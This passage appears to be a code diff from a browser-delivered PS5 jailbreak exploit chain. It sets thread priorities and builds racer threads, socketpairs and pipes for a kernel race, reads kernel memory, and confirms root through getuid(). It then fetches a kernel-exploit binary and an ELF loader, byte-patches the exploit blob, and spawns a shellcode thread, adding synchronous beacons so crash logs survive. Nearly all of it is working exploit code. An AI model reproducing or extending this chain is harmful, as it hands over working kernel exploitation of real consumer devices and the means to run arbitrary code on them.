+        if (!S.allproc) {
+          why = "-allproc-unresolved";
+        } else {
+          const kbase = S.allproc.sub32(PK.KERNEL_ALLPROC);
+          const sf = kbase.add32(PK.KERNEL_SECURITY_FLAGS);
+          const r = await kreadRetry64(sf.add32(8));
+          if (!r || r.ret !== 8) why = "-read-failed";
+          else tid = (r.v.low >>> 8) & 0xff;   // TARGET_ID = SECURITY_FLAGS + 9
+        }
+      }
+    } catch (e) {
+      why = "-read-threw";
+    }
+
+    const isKit = tid === 0x81;
+    const kitIsh = tid === 0x81 || tid === 0x82 || tid === 0x83;
+    const apply = kitIsh && (forced || (!disabled && isKit));
+    if (!apply) {
+      flushMark("KEXP-TARGETID",
+        "live=" + (tid < 0 ? "unread" : "0x" + tid.toString(16)) + why +
+        "-STOCK-kexp-forces-0x82" + (disabled ? "-keepkitid=0" : "") +
+        (forced && !kitIsh ? "-forced-IGNORED-not-a-kit-id" : ""));
+      return false;
+    }
+
+    // Refuse to touch anything that is not the exact stock instruction pair.
+    const stockStore = [0xc6, 0x45, 0xd6, 0x82];     // mov byte [rbp-0x2a], 0x82
+    const stockLog = [0xba, 0x82, 0x00, 0x00, 0x00]; // mov edx, 0x82
+    for (let k = 0; k < stockStore.length; ++k)
+      if (bin[0x3807 + k] !== stockStore[k]) {
+        flushMark("KEXP-TARGETID", "0x3807-not-the-stock-store-REFUSING-to-patch");
+        return false;
+      }
+    for (let k = 0; k < stockLog.length; ++k)
+      if (bin[0x382a + k] !== stockLog[k]) {
+        flushMark("KEXP-TARGETID", "0x382a-not-the-stock-log-REFUSING-to-patch");
+        return false;
+      }
+    for (let k = 0; k < 4; ++k) bin[0x3807 + k] = 0x90;   // drop the overwrite
+    bin[0x382a] = 0x0f; bin[0x382b] = 0xb6;               // movzx edx, byte [rbp-0x2a]
+    bin[0x382c] = 0x55; bin[0x382d] = 0xd6; bin[0x382e] = 0x90;
+    flushMark("KEXP-TARGETID", "live=0x" + tid.toString(16) +
+      "-KIT-keeping-it-0x3807-NOPed" + (forced ? "-forced" : ""));
+    return true;
+  }
+
+  // SYNCHRONOUS crash-surviving beacon. flushMark() paints an async Image, which never
+// leaves the process if it dies immediately afterwards - which is exactly what happens
+// on 8.20: scePthreadCreate returns 0, the kexp thread runs, and the console dies before
+// STAGE5-JOIN-PRE reaches the network. A synchronous XHR blocks until the request is on
+// the wire, so the last mark before the fault is preserved. Only used around the stage-5
+// spawn/join window; everything else keeps the async path.
+function syncMark(tag, extra) {
+  try {
+    if (window.__beaconOff) return;
+    const x = new XMLHttpRequest();
+    // "log/" so the host's 204 route matches - see flushMark. This one is synchronous
+    // and blocks the thread until the request is on the wire, so a 404 that drags the
+    // whole landing page back is paid for in the stage-5 window this exists to survive.
+    x.open("GET", "log/SYNC-" + encodeURIComponent(
+      String(tag) + (extra == null ? "" : "-" + String(extra))).slice(0, 300), false);
+    x.send(null);
+    // status 0 is a transient network error; a real HTTP failure means the route is
+    // not there and every later mark would fail the same way, so latch off instead.
+    if (x.status !== 0 && (x.status < 200 || x.status >= 300)) window.__beaconOff = true;
+  } catch (e) { }
+}
+
+async function stage5Body(opts) {
     const o = opts || {};
     const out = { ok: false, why: "", steps: [], ran: false };
 
@@ -8150,7 +7874,7 @@ export function makePoopsEngine(X) {
       "STAGE5-ENTER", "dryRun=" + !!o.dryRun + "-jailbroken=" + S.jailbroken,
     );
     if (!S.jailbroken) {
-      out.why = "stage 4 galberik not proved by getuid()";
+      out.why = "stage 4 jailbreak not proved by getuid()";
       return out;
     }
 
@@ -8170,12 +7894,12 @@ export function makePoopsEngine(X) {
 
     flushMark(
       "STAGE5-FETCH-BIN-PRE",
-      "url=" + SITE_ROOT + "payloads/" + (o.binName || "kexp_2026_05_25.bin"),
+      "url=../payloads/" + (o.binName || "kexp_2026_05_25.bin"),
     );
     try {
       const parts = [];
       const g = await fetchInto(
-        SITE_ROOT + "payloads/" + (o.binName || "kexp_2026_05_25.bin"),
+        "../payloads/" + (o.binName || "kexp_2026_05_25.bin"),
         (off, chunk) => { parts.push(chunk); },
       );
       binBytes = new Uint8Array(g.total);
@@ -8198,10 +7922,19 @@ export function makePoopsEngine(X) {
     }
     flushMark("STAGE5-FETCH-BIN-OK", "bytes=" + binBytes.length);
 
+    await kexpMaybeKeepKitId(binBytes);
+
     try {
-      const name = o.elfName || "elfldr-ps5-1360.elf";
-      flushMark("STAGE5-ELF-FETCH-PRE", "url=" + SITE_ROOT + "payloads/" + name);
-      const response = await fetch(SITE_ROOT + "payloads/" + name, {
+      // The active firmware profile may name its own elfldr build (7.00 does:
+      // the stock blob's 7.x branch carries the shipped 7.00 kernel's globals,
+      // which are wrong for the 700_t_manu proto kernel). Profiles that do not
+      // define OFFSET_PAYLOAD_ELFLDR keep the stock blob.
+      const name = o.elfName ||
+        (typeof OFFSET_PAYLOAD_ELFLDR === "string" && OFFSET_PAYLOAD_ELFLDR
+          ? OFFSET_PAYLOAD_ELFLDR
+          : "elfldr-ps5-1360.elf");
+      flushMark("STAGE5-ELF-FETCH-PRE", "url=../payloads/" + name);
+      const response = await fetch("../payloads/" + name, {
         cache: "no-store",
       });
       if (!response.ok)
@@ -8593,6 +8326,7 @@ export function makePoopsEngine(X) {
     }
 
     flushMark("STAGE5-CREATE-RET", "ret=" + tcRet + "-handle=" + hx(handle));
+    syncMark("STAGE5-CREATE-RET", "ret=" + tcRet + "-handle=" + hx(handle));
     if (tcRet !== 0) {
       out.why =
         (useSizedSceThread ? "scePthreadCreate" : "pthread_create_name_np") +
@@ -8602,6 +8336,7 @@ export function makePoopsEngine(X) {
     out.steps.push("thread spawned, handle " + hx(handle));
     flushMark("STAGE5-JOIN-PRE",
       "handle=" + hx(handle) + "-about-to-join-the-shellcode-thread",);
+    syncMark("STAGE5-JOIN-PRE", "handle=" + hx(handle) + "-thread-is-about-to-run");
 
     await runBuilt("stage5-thrd-join", () => {
       armRet(1); emitCallAddr(tj.addr, retPtr(0), handle, retBuf.base, 0);
@@ -8677,9 +8412,6 @@ export function makePoopsEngine(X) {
     pickBurnCores,
 
     buildBurnWorker,
-    tty,
-    ttyMark,
-    ttyState,
     RACER_FIELDS,
     crfree,
     triggerNetcontrol,
@@ -9120,10 +8852,6 @@ export function buildLadder(X, E) {
               (lr.detail || "?") +
               "); nothing has been changed yet",
           );
-        await E.ttyMark(
-          "PS1-ENTER",
-          "next=rtprio_thread-PRI_REALTIME/" + TK.POOPS_RTPRIO,
-        );
 
         const pr = await H.writeRtprio(
           TK.PRI_REALTIME,
@@ -9140,7 +8868,6 @@ export function buildLadder(X, E) {
         const pb = await H.readRtprio("driver-check");
         if (pb.type !== TK.PRI_REALTIME || pb.prio !== TK.POOPS_RTPRIO)
           return FAIL("driver rtprio read back " + pb.type + "/" + pb.prio);
-        await E.ttyMark("PS1-RTPRIO", "type=" + pb.type + "-prio=" + pb.prio);
         const pin = await H.pinDriver(driver.core);
         driver.affChanged = true;
         if (pin.failed)
@@ -9159,7 +8886,6 @@ export function buildLadder(X, E) {
               ((1 << driver.core) >>> 0).toString(16),
           );
         driver.pinned = true;
-        await E.ttyMark("PS1-PINNED", "core=" + driver.core);
         note(
           "driver: PRI_REALTIME/256 set and read back, pinned to core " +
             driver.core +
@@ -9167,7 +8893,6 @@ export function buildLadder(X, E) {
         );
 
         E.buildBuffers();
-        await E.ttyMark("PS1-BUFFERS", "built");
         note(
           "recvmsg iovec array is " +
             PK.MSG_IOV_NUM +
@@ -9188,11 +8913,9 @@ export function buildLadder(X, E) {
         const [ia, ib] = await E.socketpairUnix("iov");
         const [ua, ub] = await E.socketpairUnix("uio");
         E.setSocketpairs(ia, ib, ua, ub);
-        await E.ttyMark("PS1-SOCKETPAIRS", "iov=" + ia + "." + ib + "-uio=" + ua + "." + ub);
         const [mr, mw] = await E.pipe2Nonblock("master");
         const [vr, vw] = await E.pipe2Nonblock("victim");
         E.setPipes(mr, mw, vr, vw);
-        await E.ttyMark("PS1-PIPES", "master=" + mr + "." + mw + "-victim=" + vr + "." + vw);
         note(
           "master pipe r=" +
             mr +
@@ -9205,9 +8928,7 @@ export function buildLadder(X, E) {
         );
 
         await E.setupRacerGroups(driver.core);
-        await E.ttyMark("PS1-GROUPS", "core=" + driver.core + "-next=spawnRacers");
         const sp = await E.spawnRacers(driver.core);
-        await E.ttyMark("PS1-SPAWNED", sp.map((x) => x.name + "=" + x.live).join("-"));
         note(
           "racers: " +
             sp
@@ -10158,7 +9879,7 @@ export function buildLadder(X, E) {
     async run() {
       const mode = String(cfg.payload || "");
       if (mode !== "1" && mode !== "dry") return NA("stage 5 runs a payload, opt-in only");
-      if (!E.S.jailbroken) return FAIL("stage 5 needs stage 4's galberik (getuid()==0); " +
+      if (!E.S.jailbroken) return FAIL("stage 5 needs stage 4's jailbreak (getuid()==0); " +
         "jitshm_create and an RWX mmap need it",);
       const r = await E.stage5({ dryRun: mode === "dry" });
       for (const st of r.steps) note(st);
